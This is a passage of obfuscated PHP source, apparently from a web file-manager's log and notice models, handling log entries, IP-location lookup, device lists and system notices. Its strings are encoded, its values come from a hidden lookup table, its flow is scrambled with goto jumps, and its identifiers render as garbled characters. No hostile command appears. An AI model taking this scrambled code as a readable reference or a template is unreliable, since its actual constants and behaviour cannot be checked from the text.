parent::update($AÅ”ğŒÁ¦[$D÷Íù³¯å[364]], $dŒ°—º÷â); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\137\x6c\157\147"; protected $dataAuto = array(array("\143\162\x65\141\164\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $C¨‡ô³ÙŒå =& $_SERVER[£ü]; return array($C¨‡ô³ÙŒå[2330] => LNG($C¨‡ô³ÙŒå[2331]), $C¨‡ô³ÙŒå[2332] => LNG($C¨‡ô³ÙŒå[2333]), $C¨‡ô³ÙŒå[2004] => LNG($C¨‡ô³ÙŒå[2334]), $C¨‡ô³ÙŒå[2335] => LNG($C¨‡ô³ÙŒå[2336]), $C¨‡ô³ÙŒå[2337] => LNG($C¨‡ô³ÙŒå[2338]), $C¨‡ô³ÙŒå[2339] => LNG($C¨‡ô³ÙŒå[2340]), $C¨‡ô³ÙŒå[2341] => LNG($C¨‡ô³ÙŒå[2342]), $C¨‡ô³ÙŒå[2343] => LNG($C¨‡ô³ÙŒå[2344]), $C¨‡ô³ÙŒå[2035] => LNG($C¨‡ô³ÙŒå[2345]), $C¨‡ô³ÙŒå[2036] => LNG($C¨‡ô³ÙŒå[2346]), $C¨‡ô³ÙŒå[2347] => LNG($C¨‡ô³ÙŒå[2348]), $C¨‡ô³ÙŒå[2349] => LNG($C¨‡ô³ÙŒå[2350]), $C¨‡ô³ÙŒå[2351] => LNG($C¨‡ô³ÙŒå[2352]), $C¨‡ô³ÙŒå[2353] => LNG($C¨‡ô³ÙŒå[2354]), $C¨‡ô³ÙŒå[2033] => LNG($C¨‡ô³ÙŒå[2355]), $C¨‡ô³ÙŒå[2039] => LNG($C¨‡ô³ÙŒå[2356]), $C¨‡ô³ÙŒå[2357] => LNG($C¨‡ô³ÙŒå[2358]), $C¨‡ô³ÙŒå[2359] => LNG($C¨‡ô³ÙŒå[2360]), $C¨‡ô³ÙŒå[2361] => LNG($C¨‡ô³ÙŒå[2362]), $C¨‡ô³ÙŒå[2363] => LNG($C¨‡ô³ÙŒå[2364]), $C¨‡ô³ÙŒå[2042] => LNG($C¨‡ô³ÙŒå[2365]), $C¨‡ô³ÙŒå[2043] => LNG($C¨‡ô³ÙŒå[2366]), $C¨‡ô³ÙŒå[2367] => LNG($C¨‡ô³ÙŒå[2368]), $C¨‡ô³ÙŒå[2369] => LNG($C¨‡ô³ÙŒå[2370]), $C¨‡ô³ÙŒå[2371] => LNG($C¨‡ô³ÙŒå[2372]), $C¨‡ô³ÙŒå[2373] => LNG($C¨‡ô³ÙŒå[2374]), $C¨‡ô³ÙŒå[2375] => LNG($C¨‡ô³ÙŒå[2376]), $C¨‡ô³ÙŒå[2037] => LNG($C¨‡ô³ÙŒå[2377]), $C¨‡ô³ÙŒå[2378] => LNG($C¨‡ô³ÙŒå[2379]), $C¨‡ô³ÙŒå[2380] => LNG($C¨‡ô³ÙŒå[2381]), $C¨‡ô³ÙŒå[2382] => LNG($C¨‡ô³ÙŒå[2382]), $C¨‡ô³ÙŒå[2383] => LNG($C¨‡ô³ÙŒå[2008]), $C¨‡ô³ÙŒå[2384] => LNG($C¨‡ô³ÙŒå[2385]), $C¨‡ô³ÙŒå[2386] => LNG($C¨‡ô³ÙŒå[2387]), $C¨‡ô³ÙŒå[2388] => LNG($C¨‡ô³ÙŒå[2389]), $C¨‡ô³ÙŒå[2390] => LNG($C¨‡ô³ÙŒå[2391]), $C¨‡ô³ÙŒå[2392] => LNG($C¨‡ô³ÙŒå[2392]), $C¨‡ô³ÙŒå[2393] => LNG($C¨‡ô³ÙŒå[2394]), $C¨‡ô³ÙŒå[2395] => LNG($C¨‡ô³ÙŒå[2396]), $C¨‡ô³ÙŒå[2397] => LNG($C¨‡ô³ÙŒå[2398]), $C¨‡ô³ÙŒå[2399] => LNG($C¨‡ô³ÙŒå[2400]), $C¨‡ô³ÙŒå[2401] => LNG($C¨‡ô³ÙŒå[2402]), $C¨‡ô³ÙŒå[2403] => LNG($C¨‡ô³ÙŒå[2404])); } private function typeFile() { $EÎ´‚•Ÿß„ =& $_SERVER[£ü]; $D²ö‘„–¢» = array($EÎ´‚•Ÿß„[2039] => array($EÎ´‚•Ÿß„[2040]), $EÎ´‚•Ÿß„[2351] => array($EÎ´‚•Ÿß„[2405]), $EÎ´‚•Ÿß„[2353] => array($EÎ´‚•Ÿß„[2406]), $EÎ´‚•Ÿß„[2033] => array($EÎ´‚•Ÿß„[2034]), $EÎ´‚•Ÿß„[2359] => array(), $EÎ´‚•Ÿß„[2361] => array(), $EÎ´‚•Ÿß„[2363] => array(), $EÎ´‚•Ÿß„[2042] => array($EÎ´‚•Ÿß„[2044]), $EÎ´‚•Ÿß„[2043] => array($EÎ´‚•Ÿß„[2044]), $EÎ´‚•Ÿß„[2367] => array($EÎ´‚•Ÿß„[2407]), $EÎ´‚•Ÿß„[2369] => array($EÎ´‚•Ÿß„[2407]), $EÎ´‚•Ÿß„[2371] => array($EÎ´‚•Ÿß„[2408]), $EÎ´‚•Ÿß„[2357] => array($EÎ´‚•Ÿß„[2409]), $EÎ´‚•Ÿß„[2373] => array($EÎ´‚•Ÿß„[2410]), $EÎ´‚•Ÿß„[2375] => array($EÎ´‚•Ÿß„[2411]), $EÎ´‚•Ÿß„[2037] => array($EÎ´‚•Ÿß„[2038])); return $D²ö‘„–¢»; } private function typeAll() { goto aÙ’åÚµÀ; aÙ’åÚµÀ: $c·ë¢Ÿš =& $_SERVER[£ü]; $b‰¾Â ŒÛÆ = $this->typeList; $Bßˆ‰å§Ã = array_filter($this->typeFile()); goto aåµÅÈ”ÛÉ; aåµÅÈ”ÛÉ: foreach ($Bßˆ‰å§Ã as $E²ô†»²Ùî => $C¸ŞÑ¥¡Ñî) { $b‰¾Â ŒÛÆ[$C¸ŞÑ¥¡Ñî[0]] = $b‰¾Â ŒÛÆ[$E²ô†»²Ùî]; } $b‰¾Â ŒÛÆ[$c·ë¢Ÿš[2044]] = LNG($c·ë¢Ÿš[2412]); $b‰¾Â ŒÛÆ[$c·ë¢Ÿš[2407]] = LNG($c·ë¢Ÿš[2413]); goto fÊÑÜ¶å™¿; fÊÑÜ¶å™¿: return $b‰¾Â ŒÛÆ; goto bìÛöñŒ±; bìÛöñŒ±: } public function addLog($E’ÏùÁ÷˜, $cÁòÕĞñƒ¤ = array()) { goto dÍŠ“‡²å; dÍŠ“‡²å: $fÃœŒê­– =& $_SERVER[£ü]; if (!isset($this->typeList[$E’ÏùÁ÷˜])) { return; } $f²§İªˆ— = USER_ID ? USER_ID : (isset($cÁòÕĞñƒ¤[$fÃœŒê­–[1401]]) ? $cÁòÕĞñƒ¤[$fÃœŒê­–[1401]] : 0); goto EÛİĞÉİ©µ; bî±ÜØÆ–˜: parent::add($cÁòÕĞñƒ¤); goto Eµ¿‹Õ‰É ; EÛİĞÉİ©µ: $aÊëê˜˜Ì = get_client_ip(); if (!$cÁòÕĞñƒ¤ || strlen(json_encode($cÁòÕĞñƒ¤)) >= 1024) { $cÁòÕĞñƒ¤ = array($fÃœŒê­–[2414] => $aÊëê˜˜Ì); } else { if (is_array($cÁòÕĞñƒ¤)) { $cÁòÕĞñƒ¤[$fÃœŒê­–[2414]] = $aÊëê˜˜Ì; } else { $cÁòÕĞñƒ¤ = array($fÃœŒê­–[1024] => $cÁòÕĞñƒ¤, $fÃœŒê­–[2414] => $aÊëê˜˜Ì); } } $cÁòÕĞñƒ¤ = array($fÃœŒê­–[1391] => Session::sign(), $fÃœŒê­–[1392] => $f²§İªˆ—, $fÃœŒê­–[29] => $E’ÏùÁ÷˜, $fÃœŒê­–[1394] => json_encode($cÁòÕĞñƒ¤)); goto bî±ÜØÆ–˜; Eµ¿‹Õ‰É : } public function remove($BÅ“Å‡ä˜ô) { $this->where(array($_SERVER[£ü][382] => $BÅ“Å‡ä˜ô))->delete(); } private function _makeOrder($bÃªáø†Ÿ = '') { goto b‚Ùâìã‹; C¦èìŒ¤î³: $BŒ—âÀ±‘ = Input::get($D¡ß¼»Ô‹[404], $D¡ß¼»Ô‹[7], $D¡ß¼»Ô‹[2202], array($D¡ß¼»Ô‹[2139], $D¡ß¼»Ô‹[400])); $BŒ—âÀ±‘ = $d†Âï‡›•ì[$BŒ—âÀ±‘]; $bÃªáø†Ÿ = $bÃªáø†Ÿ . "{$c–î¨İ–¥}\40{$BŒ—âÀ±‘}"; goto dÛÔ¾Ÿ¿ñ¾; dÛÔ¾Ÿ¿ñ¾: return $this->order($bÃªáø†Ÿ); goto AŞ•Ó££â¤; b‚Ùâìã‹: $D¡ß¼»Ô‹ =& $_SERVER[£ü]; $c–î¨İ–¥ = $D¡ß¼»Ô‹[184]; $d†Âï‡›•ì = array($D¡ß¼»Ô‹[398] => $D¡ß¼»Ô‹[399], $D¡ß¼»Ô‹[400] => $D¡ß¼»Ô‹[401]); goto C¦èìŒ¤î³; AŞ•Ó££â¤: } public function get($Aë¾±âÀ¸ = '') { goto f†íÉ¨¶†½; f†íÉ¨¶†½: $Bì°¼Ÿæ† =& $_SERVER[£ü]; if (!$Aë¾±âÀ¸) { show_json(array()); } $C»·ì„®ƒˆ = array(); goto Aä„¾ã¼©; d´–Æ‡É§„: $eñ—©˜óÛ£[$Bì°¼Ÿæ†[351]] = $this->logList($eñ—©˜óÛ£[$Bì°¼Ÿæ†[351]]); return $eñ—©˜óÛ£; goto F´Ô‚—‰š¸; Aä„¾ã¼©: if ($Aë¾±âÀ¸[$Bì°¼Ÿæ†[1401]]) { $C»·ì„®ƒˆ[$Bì°¼Ÿæ†[1401]] = $Aë¾±âÀ¸[$Bì°¼Ÿæ†[1401]]; } if (isset($Aë¾±âÀ¸[$Bì°¼Ÿæ†[691]])) { $e¾È¢å‡Øï = $Aë¾±âÀ¸[$Bì°¼Ÿæ†[691]]; $eŒèÏ–ˆ = isset($Aë¾±âÀ¸[$Bì°¼Ÿæ†[692]]) ? $Aë¾±âÀ¸[$Bì°¼Ÿæ†[692]] : time(); $C»·ì„®ƒˆ[$Bì°¼Ÿæ†[184]] = array($Bì°¼Ÿæ†[318], array($e¾È¢å‡Øï, $eŒèÏ–ˆ)); } if ($Aë¾±âÀ¸[$Bì°¼Ÿæ†[29]]) { $b×øÉÔâ×Ô = explode($Bì°¼Ÿæ†[47], $Aë¾±âÀ¸[$Bì°¼Ÿæ†[29]]); $C®Û‘Õ³“˜ = $this->typeFile(); $b°ìÜˆÈÈ… = array(); foreach ($b×øÉÔâ×Ô as $cÜŒµõŸ«) { $b°ìÜˆÈÈ…[] = $cÜŒµõŸ«; if (isset($C®Û‘Õ³“˜[$cÜŒµõŸ«])) { $b°ìÜˆÈÈ… = array_merge($b°ìÜˆÈÈ…, $C®Û‘Õ³“˜[$cÜŒµõŸ«]); } } $b°ìÜˆÈÈ… = array_unique($b°ìÜˆÈÈ…); if ($b°ìÜˆÈÈ…) { $C»·ì„®ƒˆ[$Bì°¼Ÿæ†[29]] = array($Bì°¼Ÿæ†[7], $b°ìÜˆÈÈ…); } } goto Fâù±ƒá‰Ï; Fâù±ƒá‰Ï: if (!empty($Aë¾±âÀ¸[$Bì°¼Ÿæ†[2414]])) { $C»·ì„®ƒˆ[$Bì°¼Ÿæ†[401]] = array($Bì°¼Ÿæ†[747], "\45{$Aë¾±âÀ¸[$Bì°¼Ÿæ†[2414]]}\x25"); } $eñ—©˜óÛ£ = $this->_makeOrder()->where($C»·ì„®ƒˆ)->selectPage(); if (empty($eñ—©˜óÛ£[$Bì°¼Ÿæ†[351]])) { show_json(array(), !0, $eñ—©˜óÛ£[$Bì°¼Ÿæ†[348]]); } goto d´–Æ‡É§„; F´Ô‚—‰š¸: } private function ipAddress(&$d •­‘‚) { $dõ½ßŠ¥Ã =& $_SERVER[£ü]; if (!empty($d •­‘‚[$dõ½ßŠ¥Ã[2414]])) { $F¦×¬°††¤ = IpLocation::get($d •­‘‚[$dõ½ßŠ¥Ã[2414]]); if ($F¦×¬°††¤ == $dõ½ßŠ¥Ã[2415]) { $F¦×¬°††¤ = $dõ½ßŠ¥Ã[2416]; } } else { $F¦×¬°††¤ = LNG($dõ½ßŠ¥Ã[2417]); } $d •­‘‚[$dõ½ßŠ¥Ã[2418]] = $F¦×¬°††¤; } private function descZipDownload($fÍÜËÁéÛ, &$C¹¤¼ŒÂÍº) { $FŸ’‹»ÕÖ³ =& $_SERVER[£ü]; if (!isset($fÍÜËÁéÛ[$FŸ’‹»ÕÖ³[2419]])) { return; } $cˆãè¬åØº = json_decode($fÍÜËÁéÛ[$FŸ’‹»ÕÖ³[2419]], !0); foreach ($cˆãè¬åØº as $eÑÆÎ—ƒÑ) { if (!IO::init($eÑÆÎ—ƒÑ[$FŸ’‹»ÕÖ³[75]])) { continue; } if (!($fåÂƒ™²ºé = IO::infoFull($eÑÆÎ—ƒÑ[$FŸ’‹»ÕÖ³[75]]))) { continue; } $fÍÜËÁéÛ[$FŸ’‹»ÕÖ³[75]] = $eÑÆÎ—ƒÑ[$FŸ’‹»ÕÖ³[75]]; $C¹¤¼ŒÂÍº[] = $fÍÜËÁéÛ[$FŸ’‹»ÕÖ³[2235]] = $fåÂƒ™²ºé[$FŸ’‹»ÕÖ³[457]]; break; } return $fÍÜËÁéÛ; } private function getSourceList(&$f×¶…¨Ú Ù) { $eŒ‚Ù·ùÆ =& $_SERVER[£ü]; $b†„¦½Æ™Ô = array(); foreach ($f×¶…¨Ú Ù as $E´ğğÜ×ã => $c™åÈÍö¦­) { goto bµ‰‹»˜Î; D±ŞÊ´Ïîä: $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[366]]; $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[2235]]; if ($eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[29]] == $eŒ‚Ù·ùÆ[488]) { $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[401]][$eŒ‚Ù·ùÆ[994]]; $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[401]][$eŒ‚Ù·ùÆ[995]]; } goto d×¼ƒ¶É„‰; d×¼ƒ¶É„‰: if ($eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[29]] == $eŒ‚Ù·ùÆ[2243]) { $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[401]][$eŒ‚Ù·ùÆ[366]]; } goto CÑóŞĞ¨”‘; bµ‰‹»˜Î: $eĞìÖÉøÈñ = json_decode($c™åÈÍö¦­[$eŒ‚Ù·ùÆ[401]], !0); if ($c™åÈÍö¦­[$eŒ‚Ù·ùÆ[29]] == $eŒ‚Ù·ùÆ[2036]) { $eĞìÖÉøÈñ = $this->descZipDownload($eĞìÖÉøÈñ, $b†„¦½Æ™Ô); $f×¶…¨Ú Ù[$E´ğğÜ×ã][$eŒ‚Ù·ùÆ[401]] = json_encode($eĞìÖÉøÈñ); continue; } if (strpos($c™åÈÍö¦­[$eŒ‚Ù·ùÆ[29]], $eŒ‚Ù·ùÆ[2236]) !== 0) { goto aÅ×Éƒö·ã; aÅ×Éƒö·ã: if (!isset($eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[75]]) || strpos($c™åÈÍö¦­[$eŒ‚Ù·ùÆ[29]], $eŒ‚Ù·ùÆ[2420]) !== 0) { continue; } if (!IO::init($eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[75]])) { continue; } if (!($D‚®Ù• = IO::infoFull($eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[75]]))) { continue; } goto Aİ‘›”Ì¨à; c‚Æ£¤Ã‹ß: continue; goto cÜš¢¯ìÎ; Aİ‘›”Ì¨à: $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[366]] = $D‚®Ù•[$eŒ‚Ù·ùÆ[366]]; $b†„¦½Æ™Ô[] = $eĞìÖÉøÈñ[$eŒ‚Ù·ùÆ[2235]] = $D‚®Ù•[$eŒ‚Ù·ùÆ[457]]; $f×¶…¨Ú Ù[$E´ğğÜ×ã][$eŒ‚Ù·ùÆ[401]] = json_encode($eĞìÖÉøÈñ); goto c‚Æ£¤Ã‹ß; cÜš¢¯ìÎ: } goto D±ŞÊ´Ïîä; CÑóŞĞ¨”‘: } if (!$b†„¦½Æ™Ô) { return array(); } return Model($eŒ‚Ù·ùÆ[748])->sourceListInfo($b†„¦½Æ™Ô, !0); } private function logList($EØ¡º”³ôå) { goto FñÃ’ÆæÜÙ; C„ÓÌÆïŒÕ: return $F­ÛÀ‡“; goto E‡İÛÑªÀ¬; F§ÉÄ×™Ê: $dîİãéÔñù = $this->getSourceList($EØ¡º”³ôå); $AØŞ¶ÁãŠ = $this->typeAll(); $F­ÛÀ‡“ = array(); goto f×¯‘òÖ§¡; f×¯‘òÖ§¡: $C™®ºß¤öå = array(); foreach ($EØ¡º”³ôå as $aÇÄääãÒ => $B™Ö¿¤Õ†˜) { goto CÎ“º…Ø; D‘­áÛ”µÒ: $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[2201]] = $CÎ´²æ; $cå÷°‰Âñ = json_decode($B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[401]], !0); $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[2414]] = isset($cå÷°‰Âñ[$fğ³©Ë“Ú[2414]]) ? $cå÷°‰Âñ[$fğ³©Ë“Ú[2414]] : $fğ³©Ë“Ú[33]; goto d‚ùÆ¼¸÷¿; a¹‰ÃˆŸ : $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[28]] = isset($CÎ´²æ[$fğ³©Ë“Ú[28]]) ? $CÎ´²æ[$fğ³©Ë“Ú[28]] : LNG($fğ³©Ë“Ú[2417]); $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[2284]] = isset($CÎ´²æ[$fğ³©Ë“Ú[2284]]) ? $CÎ´²æ[$fğ³©Ë“Ú[2284]] : $fğ³©Ë“Ú[33]; $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[1309]] = isset($AØŞ¶ÁãŠ[$FñùŒ˜„òŒ]) ? $AØŞ¶ÁãŠ[$FñùŒ˜„òŒ] : $fŞßïé¾Ï; goto D‘­áÛ”µÒ; d‚ùÆ¼¸÷¿: $this->ipAddress($B™Ö¿¤Õ†˜); if (strpos($FñùŒ˜„òŒ, $fğ³©Ë“Ú[2236]) === 0 || isset($cå÷°‰Âñ[$fğ³©Ë“Ú[2235]])) { goto aÖŠ×å¹°®; E¹ñ’¶‘“Ä: if ($cå÷°‰Âñ[$fğ³©Ë“Ú[2248]] && $cå÷°‰Âñ[$fğ³©Ë“Ú[2248]][$fğ³©Ë“Ú[368]] == $fğ³©Ë“Ú[1070]) { $C™®ºß¤öå[] = $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[364]]; unset($EØ¡º”³ôå[$aÇÄääãÒ]); continue; } goto CÙä†Ş¸; fÖ›òİ•‘: if ($cå÷°‰Âñ[$fğ³©Ë“Ú[29]] == $fğ³©Ë“Ú[2243]) { $cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[366]] = $dîİãéÔñù[$cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[366]]]; } if ($cå÷°‰Âñ[$fğ³©Ë“Ú[29]] == $fğ³©Ë“Ú[2031]) { $cå÷°‰Âñ[$fğ³©Ë“Ú[2248]] = $cå÷°‰Âñ[$fğ³©Ë“Ú[388]]; $cå÷°‰Âñ[$fğ³©Ë“Ú[2235]] = $cå÷°‰Âñ[$fğ³©Ë“Ú[2248]][$fğ³©Ë“Ú[366]]; $cå÷°‰Âñ[$fğ³©Ë“Ú[388]] = !1; $cå÷°‰Âñ[$fğ³©Ë“Ú[366]] = $fğ³©Ë“Ú[33]; } if ($cå÷°‰Âñ[$fğ³©Ë“Ú[388]] && $cå÷°‰Âñ[$fğ³©Ë“Ú[388]][$fğ³©Ë“Ú[368]] == $fğ³©Ë“Ú[1070]) { $C™®ºß¤öå[] = $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[364]]; unset($EØ¡º”³ôå[$aÇÄääãÒ]); continue; } goto E¹ñ’¶‘“Ä; aÖŠ×å¹°®: $cå÷°‰Âñ[$fğ³©Ë“Ú[388]] = $dîİãéÔñù[$cå÷°‰Âñ[$fğ³©Ë“Ú[366]]]; $cå÷°‰Âñ[$fğ³©Ë“Ú[2248]] = $dîİãéÔñù[$cå÷°‰Âñ[$fğ³©Ë“Ú[2235]]]; if ($cå÷°‰Âñ[$fğ³©Ë“Ú[29]] == $fğ³©Ë“Ú[488]) { $cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[994]] = $dîİãéÔñù[$cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[994]]]; $cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[995]] = $dîİãéÔñù[$cå÷°‰Âñ[$fğ³©Ë“Ú[401]][$fğ³©Ë“Ú[995]]]; } goto fÖ›òİ•‘; CÙä†Ş¸: } $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[401]] = $cå÷°‰Âñ; goto EìÜµ‡ç¹„; CÎ“º…Ø: $FñùŒ˜„òŒ = $B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[29]]; $CÎ´²æ = isset($cê÷¹ùŸì·[$B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[1401]]]) ? $cê÷¹ùŸì·[$B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[1401]]] : !1; $fŞßïé¾Ï = strpos($FñùŒ˜„òŒ, $fğ³©Ë“Ú[2421]) == 0 ? LNG($fğ³©Ë“Ú[2422]) : LNG($fğ³©Ë“Ú[2417]); goto a¹‰ÃˆŸ ; EìÜµ‡ç¹„: unset($B™Ö¿¤Õ†˜[$fğ³©Ë“Ú[2423]]); $F­ÛÀ‡“[] = $B™Ö¿¤Õ†˜; goto EÓ¯ãÔñ“; EÓ¯ãÔñ“: } $this->clearSystemPathLog($C™®ºß¤öå); goto C„ÓÌÆïŒÕ; FñÃ’ÆæÜÙ: $fğ³©Ë“Ú =& $_SERVER[£ü]; $b­í¡»áÅ = array_to_keyvalue($EØ¡º”³ôå, $fğ³©Ë“Ú[33], $fğ³©Ë“Ú[1401]); $cê÷¹ùŸì· = Model($fğ³©Ë“Ú[473])->userListInfo(array_unique($b­í¡»áÅ)); goto F§ÉÄ×™Ê; E‡İÛÑªÀ¬: } private function clearSystemPathLog($Fùğ˜à´Ö) { $E÷â‘ù¾°ó =& $_SERVER[£ü]; if (count($Fùğ˜à´Ö) == 0) { return; } $c›íÙÓßŒİ = array($E÷â‘ù¾°ó[364] => array($E÷â‘ù¾°ó[7], array_unique($Fùğ˜à´Ö))); $this->where($c›íÙÓßŒİ)->delete(); } public function deviceList($C×ç¿°®™Ú, $f”áÍò¶Ñ = 0) { $e·æ¿Çà‘ =& $_SERVER[£ü]; $Cï£òÊê‘ª = array($e·æ¿Çà‘[1401] => $C×ç¿°®™Ú, $e·æ¿Çà‘[184] => array($e·æ¿Çà‘[918], $f”áÍò¶Ñ), $e·æ¿Çà‘[29] => $e·æ¿Çà‘[2004]); $FÍÀ¶æëŠ = array(); $f¯é‚°çãÎ = $this->field($e·æ¿Çà‘[2424])->where($Cï£òÊê‘ª)->order($e·æ¿Çà‘[2246])->limit(50)->select(); foreach ($f¯é‚°çãÎ as $Aìî¾óÄ’É => $b­ƒ­•×÷£) { goto d÷Ù×İ™¡; Bì˜©‡Œõ’: $this->ipAddress($b­ƒ­•×÷£); $b­ƒ­•×÷£[$e·æ¿Çà‘[401]] = $EƒËÔ‡®Ì½; $FÍÀ¶æëŠ[$bêåÅ¿ÈÌÈ] = $b­ƒ­•×÷£; goto aÀÔ‚Ë‡ì‹; d÷Ù×İ™¡: if ($Aìî¾óÄ’É > 0 && abs($b­ƒ­•×÷£[$e·æ¿Çà‘[184]] - $f¯é‚°çãÎ[$Aìî¾óÄ’É - 1][$e·æ¿Çà‘[184]]) < 5) { continue; } $EƒËÔ‡®Ì½ = json_decode($b­ƒ­•×÷£[$e·æ¿Çà‘[401]], !0); $b­ƒ­•×÷£[$e·æ¿Çà‘[2414]] = isset($EƒËÔ‡®Ì½[$e·æ¿Çà‘[2414]]) ? $EƒËÔ‡®Ì½[$e·æ¿Çà‘[2414]] : $e·æ¿Çà‘[33]; goto f¼¬²ê‰×; f¼¬²ê‰×: unset($EƒËÔ‡®Ì½[$e·æ¿Çà‘[2414]]); $bêåÅ¿ÈÌÈ = $this->deviceType($EƒËÔ‡®Ì½[$e·æ¿Çà‘[2237]]); if (isset($FÍÀ¶æëŠ[$bêåÅ¿ÈÌÈ])) { continue; } goto Bì˜©‡Œõ’; aÀÔ‚Ë‡ì‹: } return array_values($FÍÀ¶æëŠ); } public function deviceType($d†§—•»¥¿) { return $d†§—•»¥¿; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x6e\157\x74\x69\x63\x65\x4c\151\163\164"; public $field = array("\156\141\x6d\145", "\143\157\x6e\164\145\156\x74", "\x61\165\164\x68", "\155\157\144\145", "\x74\151\155\x65", "\x74\x79\160\x65", "\154\x65\166\145\154", "\x65\x6e\x61\x62\154\x65", "\x73\x6f\x72\x74"); public function listData($f„à¨·œ¤Ù = false, $fçŠô–Áµ¾ = "\163\x6f\x72\164", $CÚµõœ ¥Ñ = false) { return parent::listData($f„à¨·œ¤Ù, $fçŠô–Áµ¾, $CÚµõœ ¥Ñ); } public function add($EÄõ³¡±¨Ñ) { goto C‚Á‡Ãí‰²; C‚Á‡Ãí‰²: $Aª‡ãáÑ¥Ÿ =& $_SERVER[£ü]; $Dõ›ˆÀƒçÊ = $this->findByName($EÄõ³¡±¨Ñ[$Aª‡ãáÑ¥Ÿ[28]]); if ($Dõ›ˆÀƒçÊ) { return !1; } goto cÃĞÒò¾¢; cÃĞÒò¾¢: $aÅÀÆñÖ‰» = time(); if ($EÄõ³¡±¨Ñ[$Aª‡ãáÑ¥Ÿ[12]] == $Aª‡ãáÑ¥Ÿ[2425]) { $aÅÀÆñÖ‰» = strtotime($EÄõ³¡±¨Ñ[$Aª‡ãáÑ¥Ÿ[187]]); } $EÄõ³¡±¨Ñ[$Aª‡ãáÑ¥Ÿ[187]] = $aÅÀÆñÖ‰»; goto E¼¤Ğ² “; E¼¤Ğ² “: return parent::insert($EÄõ³¡±¨Ñ); goto EëŒ™À¨Øì; EëŒ™À¨Øì: } public function update($aè¯¥ÚÁªß, $f‰ÎùÚÌ) { goto c­–Ñ¸Ç‹°; bÍ•¼í‹: if (!$D³©™••­³ || $aƒ‹ …”ˆÒ && $aƒ‹ …”ˆÒ[$eÛğ®¸ÄÑ[364]] != $D³©™••­³[$eÛğ®¸ÄÑ[364]]) { return !1; } $Eó™Ûà¼£  = time(); if ($f‰ÎùÚÌ[$eÛğ®¸ÄÑ[12]] == $eÛğ®¸ÄÑ[2425]) { $Eó™Ûà¼£  = strtotime($f‰ÎùÚÌ[$eÛğ®¸ÄÑ[187]]); } goto eç£õßÒù±; c­–Ñ¸Ç‹°: $eÛğ®¸ÄÑ =& $_SERVER[£ü]; $D³©™••­³ = $this->listData($aè¯¥ÚÁªß); $aƒ‹ …”ˆÒ = $this->findByName($f‰ÎùÚÌ[$eÛğ®¸ÄÑ[28]]); goto bÍ•¼í‹; eç£õßÒù±: $f‰ÎùÚÌ[$eÛğ®¸ÄÑ[187]] = $Eó™Ûà¼£ ; return parent::update($aè¯¥ÚÁªß, $f‰ÎùÚÌ); goto bŸò’…¨À‡; bŸò’…¨À‡: } public function remove($Bå˜î“êå) { $fÁˆÂ¿Œ¸… = $this->listData($Bå˜î“êå); if (!$fÁˆÂ¿Œ¸… || $fÁˆÂ¿Œ¸…[$_SERVER[£ü][1070]]) { return !1; } return parent::remove($Bå˜î“êå); } public function sort($dÌò½ô“…, $C•²Õ—Æ±Â) { return parent::update($dÌò½ô“…, $C•²Õ—Æ±Â); } public function enable($B§çŒ·õä, $F†‘‡†åŠ™) { return parent::update($B§çŒ·õä, array($_SERVER[£ü][2426] => $F†‘‡†åŠ™)); } private function initUserOption() { $E×Ÿ÷¸³§õ =& $_SERVER[£ü]; $this->optionType = $E×Ÿ÷¸³§õ[2427]; $this->modelType = $E×Ÿ÷¸³§õ[2428]; $this->field = array($E×Ÿ÷¸³§õ[2429], $E×Ÿ÷¸³§õ[28], $E×Ÿ÷¸³§õ[187], $E×Ÿ÷¸³§õ[29], $E×Ÿ÷¸³§õ[2430], $E×Ÿ÷¸³§õ[678], $E×Ÿ÷¸³§õ[180]); } public function userNoticeGet($C‡ ¥¥É = false) { $this->initUserOption(); return parent::listData($C‡ ¥¥É, $_SERVER[£ü][364], !0); } public function userNoticeAdd($a‰Ô½ÍŠİÇ) { $c®ö—¢‹¬ =& $_SERVER[£ü]; $this->initUserOption(); $aŸÉÈ†öŠÎ = $this->findByKey($c®ö—¢‹¬[2429], $a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[364]]); if ($aŸÉÈ†öŠÎ) { return !0; } $f»±ˆÎ = array($c®ö—¢‹¬[2429] => $a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[364]], $c®ö—¢‹¬[28] => $a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[28]], $c®ö—¢‹¬[187] => 